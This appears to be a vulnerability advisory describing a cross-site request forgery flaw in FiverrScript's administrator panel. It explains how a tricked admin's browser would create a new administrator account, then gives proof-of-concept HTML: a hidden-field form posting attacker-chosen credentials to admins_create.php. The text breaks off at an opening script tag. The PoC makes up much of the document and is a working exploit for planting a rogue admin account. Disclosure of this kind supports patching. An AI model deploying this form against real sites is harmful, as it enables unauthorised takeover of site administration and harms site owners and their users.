FiverrScript is vulnerable to CSRF attack (No CSRF token in place) meaning
that if an admin user can be tricked to visit a crafted URL created by
attacker (via spear phishing/social engineering), a form will be submitted
to (http://localhost/fiverrscript/administrator/admins_create.php) that
will add a new user as administrator.
Once exploited, the attacker can login to the admin panel (
http://localhost/fiverrscript/administrator/index.php)
using the username and the password he posted in the form.

CSRF PoC Code
=============

<form action="http://localhost/fiverrscript/administrator/admins_create.php"
method="post" id="main_form" name="main_form"
enctype="multipart/form-data"><input type="hidden" id="submitform"
name="submitform" value="1">
<input type="hidden" name="username" value="attackerUsername">
<input type="hidden" name="password" value="attackerPreferedPW" >
<input type="hidden" name="email" value="attackeremail@something.com">

<script>
